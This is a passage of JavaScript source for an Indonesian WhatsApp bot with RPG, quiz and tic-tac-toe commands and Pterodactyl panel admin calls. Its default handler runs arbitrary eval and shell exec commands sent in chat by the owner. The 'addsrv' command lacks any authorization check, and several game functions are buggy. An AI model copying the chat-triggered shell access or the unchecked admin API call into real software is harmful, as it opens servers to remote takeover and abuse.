reply(teksehmazeh)
}
break
//========================================================================//
case 'leaderboard':
{ 
let txt = ` *LEADERBOARD* \n\n`
for (let i of _buruan){
txt += `*🐾ID :* ${i.id}\n`
txt += `*🐟Ikan* : ${i.ikan}\n`
txt += `*🐔Ayam* : ${i.ayam}\n`
txt += `*🐇Kelinci* : ${i.kelinci}\n`
txt += `*🐑Domba* : ${i.domba}\n`
txt += `*🐄Sapi* : ${i.sapi}\n`
txt += `*🐘Gajah* : ${i.gajah}\n\n`
}
 reply(txt)
}
 break
//========================================================================//
case 'mining': case 'mine':{
if (!isInventory){ addInventori(m.sender) }
if (isCekDarah < 1) return reply(`Kamu kelelahan!, cobalah heal menggunakan potion`) 
let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
var besinya = besi[Math.floor(Math.random() * besi.length)]
var emasnya = emas[Math.floor(Math.random() * emas.length)]
var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]
setTimeout( () => {
let caption = `[ Hasil Tambang ]\n*Iron* : ${besinya}\n*Gold* : ${emasnya}\n*Emerald* : ${emeraldnya}`
putu.sendMessage(m.chat, { image: { url: './media/tambang.jpg' }, caption: caption }, { quoted: m })
}, 7000)
setTimeout( () => {
reply(`${pushname} Mulai Menambang`)
}, 1500)
kurangDarah(m.sender, 10)
addBesi(m.sender, besinya)
addEmas(m.sended, emasnya)
addEmerald(m.sender, emeraldnya)
}
break
//========================================================================//
//transaksi
 case 'beli': case 'buy':{
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m.sender) }
 if (!isInventory){ addInventori(m.sender) }
 if (!q) return reply(`Apa yg ingin kamu beli?\n\n1.potion\n2.baitfood\n\nContoh: ${prefix + command} baitfood`)
 var anu = args[1]
if (args[0] === 'potion'){
let noh = 100000 * anu
 if (!args[1]) return reply(`Contoh : ${prefix + command} potion 2\n 1 Potion = 100000 Money`)
 if (isMonay < noh) return reply('Uang mu tidak mencukupi')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addPotion(m.sender, apalu)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Potion Mu:* ${getPotion(m.sender)}`)
}, 2000) 
 } else 
 if (args[0] === 'baitfood'){
let noh = 5000 * anu
 if (!args[1]) return reply(`Contoh : ${prefix + command} baitfood 2\n 1 Bait Food = 2500 Money`)
 if (isMonay < noh) return reply('Uang mu tidak mencukupi')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addUmpan(m.sender, apalu)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Bait Food Mu:* ${getUmpan(m.sender)}`)
}, 2000) 
} else 
if (args[0] === 'limit'){
let noh = 35000 * anu
 if (!args[1]) return reply(`Contoh : ${prefix + command} limit 2\n 1 Limit = 35000 Money`)
 if (isMonay < noh) return reply('Uang mu tidak mencukupi')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addLimit(m.sender, apalu)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Your Limit* : ${getLimit(m.sender)}`)
}, 2000) 
} else { reply("Incorrect Format!") }
 }
 break
//========================================================================//
 case 'sell': case 'jual':{
 if (!q) reply(`What Do You Want To Sell??\nContoh : ${prefix + command} fish 2`)
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m.sender) }
 if (!isInventory){ addInventori(m.sender) }
 var anu = args[1]
 if (args[0] === 'fish'){
 if (isIkan < anu) return reply(`Kamu Tidak Memiliki Cukup Ikan Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} fish 2\n 1 Fish = 1500 Money`)
 kurangIkan(m.sender, anu)
 let monaynya = 1500 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Ikan Mu:* ${getIkan(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'chicken'){
 if (isAyam < anu) return reply(`Kamu Tidak Memiliki Cukup Ayam Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} chicken 2\n 1 Chicken = 2500 Money`)
 kurangAyam(m.sender, anu)
 let monaynya = 2500 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Ayam Mu:* ${getAyam(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'rabbit'){
 if (isKelinci < anu) return reply(`Kamu Tidak Memiliki Cukup Kelinci Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} rabbit 2\n 1 Rabbit = 3000 Money`)
 kurangKelinci(m.sender, anu)
 let monaynya = 3000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Kelinci Mu:* ${getKelinci(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'sheep'){
 if (isDomba < anu) return reply(`Kamu Tidak Memiliki Cukup Domba Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} domba 2\n 1 Sheep = 5000 money`)
 kurangDomba(m.sender, anu)
 let monaynya = 5000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Domba Mu:* ${getDomba(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'cow'){
 if (isSapi < anu) return reply(`Kamu Tidak Memiliki Cukup Sapi Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} cow 2\n 1 Cow = 10000 Money`)
 kurangSapi(m.sender, anu)
 let monaynya = 10000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Sapi Mu:* ${getSapi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'elephant'){
 if (isGajah < anu) return reply(`Kamu Tidak Memiliki Cukup Gajah Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} elephant 2\n 1 Elephant = 15000 Money`)
 kurangGajah(m.sender, anu)
 let monaynya = 15000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Gajahmu:* ${getGajah(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'iron'){
 if (isBesi < anu) return reply(`Kamu Tidak Memiliki Cukup Besi Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} iron 2\n 1 Iron = 15000 Money`)
 kurangBesi(m.sender, anu)
 let monaynya = 16000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Besi Mu:* ${getBesi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'gold'){
 if (isEmas < anu) return reply(`Kamu Tidak Memiliki Cukup Emas Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} gold 2\n 1 Gold = 50000 Money`)
 kurangEmas(m.sender, anu)
 let monaynya = 50000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Emas Mu:* ${getEmas(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'emerald'){
 if (isEmerald < anu) return reply(`Kamu Tidak Memiliki Cukup Emerald Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} emerald 2\n 1 Emerald = 100000 Money`)
 kurangEmerald(m.sender, anu)
 let monaynya = 100000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Emerald Mu:* ${getEmerald(m.sender)}`)
}, 2000) 
 } else { reply("Incorrect Format!") }
 }
 break
//========================================================================//
 case 'heal':{
 if (!isCekDarah < 1) return reply('Kamu Hanya Bisa Menggunakannya Saat Darahmu 0')
 if (isCekDarah > 100) return reply('Darahmu Masih Full')
 if (isPotion < 1) return reply(`Kamu Tidak Punya Potion, Belilah dengan cara #buypotion _jumlah_`) 
 addDarah(m.sender, 100)
 kurangPotion(m.sender, 1)
 reply('Success! Darahmu Full Kembali')
 }
 break
//========================================================================// 
 case 'hunt': case 'hunting': case 'berburu':{
 if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
 if (isCekDarah < 1) return reply('Your Blood Is Gone, Try To Heal Using Potions') 
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
let luka = ["Tertusuk Duri Saat Berburu","Terpleset Ke Jurang Saat Berburu","Tertangkap Hewan Buas","Tidak Berhati-hati","Terjerat Akar","Terjatuh Saat berburu"]
let location = ["Hutan","Hutan Amazon","Hutan Tropis","Padang Rumput","Hutan Afrika","Pegunungan"]
var ikanmu = Math.ceil(Math.random() * 10)
var ayam = Math.ceil(Math.random() * 8)
var kelinci = Math.ceil(Math.random() * 7)
var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)] 
var lukanya = luka[Math.floor(Math.random() * luka.length)]
var lokasinya = location[Math.floor(Math.random() * location.length)]
 if (lokasinya === 'Hutan') {
 var image = './media/rimba.jpg'
} else
 if (lokasinya === 'Hutan Amazon') {
 var image ='./media/amazon.jpg'
} else
 if (lokasinya === 'Hutan Tropis') {
 var image = './media/tropis.jpg'
} else
 if (lokasinya === 'Padang Rumput') {
 var image = './media/padang_rumput.jpg'
} else
 if (lokasinya === 'Hutan Afrika') {
 var image = './media/afrika.jpg'
} else
 if (lokasinya === 'Pegunungan') {
var image = './media/pegunungan.jpg'
}
 setTimeout( () => {
let teksehmazeh = `_[ Hasil Berburu ]_\n`
teksehmazeh += `*🐟Ikan* : ${ikanmu}\n`
teksehmazeh += `*🐔Ayam* : ${ayam}\n`
teksehmazeh += `*🐇Kelinci* : ${kelinci}\n`
teksehmazeh += `*🐑Domba* : ${domba}\n`
teksehmazeh += `*🐄Sapi* : ${sapi}\n`
teksehmazeh += `*🐘Gajah* : ${gajah}\n\n`
teksehmazeh += `_[ INFO ]_\n`
teksehmazeh += `*Lokasi* : ${lokasinya}\n`
teksehmazeh += `*Luka* : ${lukanya}, Darah - 10\n`
teksehmazeh += `*Sisa Darah* : ${getDarah(m.sender)}\n`
putu.sendMessage(m.chat, { image: { url: image }, caption: teksehmazeh }, { quoted: m })
}, 5000)
setTimeout( () => {
reply(`${pushname} Mulai Berburu Di ${lokasinya}`)
}, 1000) 
 addIkan(m.sender, ikanmu) 
addAyam(m.sender, ayam) 
addKelinci(m.sender, kelinci)
addDomba(m.sender, domba)
addSapi(m.sender, sapi)
addGajah(m.sender, gajah)
 kurangDarah(m.sender, 10)
 }
 break       
        case "listadmin": {
  if (!isCreator) return reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await lenwy.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
             case "addsrv": {
let s = text.split(',');
if (s.length < 7) return reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
break

case "buatsws":{
if (!isCreator) return reply('*Khusus Premium*')
await LenwyLD ()
 if (!quoted) reply `Balas Sticker Dengan Caption ${prefix + command}`
if (!/webp/.test(mime)) reply `Balas sticker dengan caption *${prefix + command}*`
const media = await lenwy.downloadAndSaveMediaMessage(quoted)
lenwy.sendMessage('status@broadcast', { sticker: { url: media }}, {statusJidList: pengguna})
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break

case 'tebak': {
if (isBan) return reply('*Kamu Di Ban Owner*')
 if (!text) reply `Contoh : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
 if (args[0] === "lagu") {
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await JSON.parse(fs.readFileSync('./database/Games/tebaklagu.json'));
 let result = anu[Math.floor(Math.random() * anu.length)]
 let msg = await lenwy.sendMessage(from, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, {quoted:m})
 lenwy.sendText(from, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
 tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 lenwy.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/24f30f85f768682d31915.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lagu`},{quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'gambar') {
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 lenwy.sendImage(from, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
 tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 lenwy.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/24f30f85f768682d31915.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak gambar`}, {quoted:m}) 
 delete tebakgambar[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'kata') {
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 lenwy.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 lenwy.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/24f30f85f768682d31915.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kata` }, {quoted:m}) 
 delete tebakkata[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'kalimat') {
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 lenwy.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 lenwy.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/24f30f85f768682d31915.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'lirik') {
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 lenwy.sendText(from, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
 tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 lenwy.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/24f30f85f768682d31915.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lirik`} , {quoted:m}) 
 delete tebaklirik[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'lontong') {
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 lenwy.sendText(from, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
 caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
 })
 await sleep(60000)
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 lenwy.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/24f30f85f768682d31915.jpg' }, caption:`Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
 }
 }
}
break

case 'kuismath': case 'math': {
if (isBan) return reply('*Kamu Di Ban Owner*')
 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let { genMath, modes } = require('./src/math')
 if (!text) reply `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
 let result = await genMath(text.toLowerCase())
 lenwy.sendText(from, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
 kuismath[m.sender.split('@')[0]] = result.jawaban
 })
 await sleep(result.waktu)
 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
 delete kuismath[m.sender.split('@')[0]]
 }
}
break

case 'ttc': case 'ttt': case 'tictactoe': {
if (isBan) return reply('*Kamu Di Ban Owner*')
 let TicTacToe = require("./lib/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
reply('Partner ditemukan!')
room.o = from
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await lenwy.sendText(room.x, str, m, { mentions: parseMention(str) } )
await lenwy.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: from,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
this.game[room.id] = room
}
}
break

case 'delttc': case 'delttt': {
if (isBan) return reply('*Kamu Di Ban Owner*')
 let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
if (!roomnya) reply `Kamu sedang tidak berada di room tictactoe !`
delete this.game[roomnya.id]
reply(`Berhasil delete session room tictactoe !`)
}
break

case 'suitpvp2443417': case 'suit2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, from, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) reply `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await lenwy.sendText(from, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) lenwy.sendText(from, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break

case 'qc': {
if (isBan) return reply('*Kamu Di Ban Owner*')
            if (!q) return ('Masukan Text')
            let ppnyauser = await await lenwy.profilePictureUrl(m.sender, 'image').catch(_=> 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
            const rest = await quote(q, pushname, ppnyauser)
            lenwy.sendImageAsSticker(from, rest.result, m, { packname: `${global.packname}`, author: `${global.author}`})
            }
            break

case  'qcstick':{
if (isBan) return reply('*Kamu Di Ban Owner*')
let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
if (!teks) return reply(`Cara Penggunaan ${prefix}qc teks`)
const text = `${teks}`
const username = await lenwy.getName(m.quoted ? m.quoted.sender : m.sender)
const avatar = await lenwy.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)

const json = {
type: "quote",
format: "png",
backgroundColor: "#FFFFFF",
width: 700,
height: 580,
scale: 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": username,
"photo": {
"url": avatar
}
},
"text": text,
"replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const buffer = Buffer.from(res.data.result.image, "base64");
let encmedia = await lenwy.sendImageAsSticker(m.chat, buffer, m, { packname: global.packname, 
author: global.author, 
categories: ['🤩', '🎉'],
id: '12345',
quality: 100,
background: 'transparent'})
await fs.unlinkSync(encmedia)
})
}
break 

case 'del':
case 'delete':{
lenwy.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: true,
id: m.quoted.id,
participant: m.quoted.sender
}
})
}
break

default:
if (budy.startsWith('=>')) {
if (!isCreator) return reply('*Khusus Premium*')
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return reply(bang)}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return reply('*Khusus Premium*')
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
await reply(String(err))}}
if (budy.startsWith('$')) {
if (!isCreator) return reply('*Khusus Premium*')
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)})}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.isBaileys) return
if (from.endsWith('broadcast')) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
lenwy.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
console.log(util.format(err))
let e = String(err)
lenwy.sendMessage('6283829102407' + "@s.whatsapp.net", { text: `🍁 *Hai Kak, Ada Yang Error Nih! Di Bagian :* ` + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
}}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
